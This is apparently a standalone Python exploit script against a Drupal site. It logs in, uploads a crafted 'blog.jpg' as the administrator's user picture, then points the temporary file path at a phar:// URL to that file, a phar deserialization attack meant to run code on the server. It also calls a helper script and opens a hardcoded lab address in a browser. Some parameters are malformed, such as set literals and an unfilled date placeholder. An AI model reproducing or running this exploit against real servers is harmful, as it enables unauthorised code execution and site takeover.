import requests
import os
import time
time.strftime("%Y-%m",time.localtime())
s=requests.session()
target=input("ip:")
port=int(input("port:"))
username=input("user:")
password=input("password:")
form_build_id=input("form_build_id(pass):")
form_token=input("form_token(pass):")
headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "zh,en-US;q=0.7,en;q=0.3","Accept-Encoding": "gzip, deflate","Referer": f"http://{target}:{port}/user/login","Upgrade-Insecure-Requests": "1"}
proxies ={"http":"http://127.0.0.1:8080"}

data={"name":username,"pass":password,"form_id":"user_login_form","op":"Log+in"}

res=s.post(url=f"http://{target}:{port}/user/login",headers=headers,data=data)
res=s.get(url=f"http://{target}:{port}/")





data={
"current_pass":"",
"mail":"123@123.com",
"name":"root",
"pass[pass1]":"",
"pass[pass2]":"",
"status":"",
"roles[administrator]":"administrator",
"user_picture[0][fids]":"",
"user_picture[0][display]":"1",
"form_build_id":{form_build_id},
"form_token":{form_token},
"form_id":"user_form",
"contact":"1",
"timezone":"UTC",
"_triggering_element_name":"user_picture_0_upload_button",
"_triggering_element_value":"Upload",
"_drupal_ajax":"1",
"ajax_page_state[theme]":"seven",
"ajax_page_state[theme_token]":"0DeS6yuo_TC_rsEl3YdaM4vaJT7TMuPQkKNGv_jMd3Q",
"ajax_page_state[libraries]":"big_pipe/big_pipe,classy/base,classy/image-widget,classy/messages,contextual/drupal.contextual-links,contextual/drupal.contextual-toolbar,core/drupal.active-link,core/drupal.collapse,core/html5shiv,core/jquery.form,core/normalize,file/drupal.file,seven/drupal.nav-tabs,seven/global-styling,shortcut/drupal.shortcut,toolbar/toolbar,toolbar/toolbar.escapeAdmin,tour/tour,user/drupal.user,user/drupal.user.icons"
}
request_file = {'files[user_picture_0]':('blog.jpg',open('blog.jpg','rb'),'image/jpeg',{})}

res=s.post(url=f"http://{target}:{port}/user/1/edit?element_parents=user_picture/widget/0&ajax_form=1&_wrapper_format=drupal_ajax",data=data,files=request_file)






data={
"current_pass":"",
"mail":"123@123.com",
"name":"root",
"pass[pass1]":"",
"pass[pass2]":"",
"status":"1",
"roles[administrator]":"administrator",
"user_picture[0][fids]":"3",
"user_picture[0][width]":"198",
"user_picture[0][height]":"198",
"user_picture[0][display]":"1",
"form_build_id":{form_build_id},
"form_token":{form_token},
"form_id":"user_form",
"contact":"1",
"timezone":"UTC",
"op":"Save"
}


res=s.post(url=f"http://{target}:{port}/user/1/edit",data=data)


login=input("Are you login(y/n):")
if((login=="y") | (login=="Y")):
    pass
else:
    os.system("firefox http://192.168.41.6:8080/user/login")

print("to upload blog.jpg")
os.system("firefox http://192.168.41.6:8080/user/1/edit")

os.system(f"python3 catpwd.py {username} {password} {target} {port}")


headers={"Referer": f"http://{target}:{port}/admin/config/media/file-system"}

data={"file_temporary_path":"phar://sites/default/files/pictures/{date}/blog.jpg","phar://sites/default/files/pictures/{date}/blog.jpg":"public","temporary_maximum_age":"21600","form_build_id":"form-irUAkhC2DBHlefiUy2YwIoC2J8P7RanTBY8zAb0EcnA","form_token":"Vdo7xWRwxLyBtnrcbwPPQvSe6GV_CSHDxLAlqMEUtXs","form_id":"system_file_system_settings","op":"system_file_system_settings"}

res=s.post(url=f"http://{target}:{port}/admin/config/media/file-system",data=data,headers=headers)
end=(res.text).find("<!DOCTYPE html>")
print(res.text[:end])
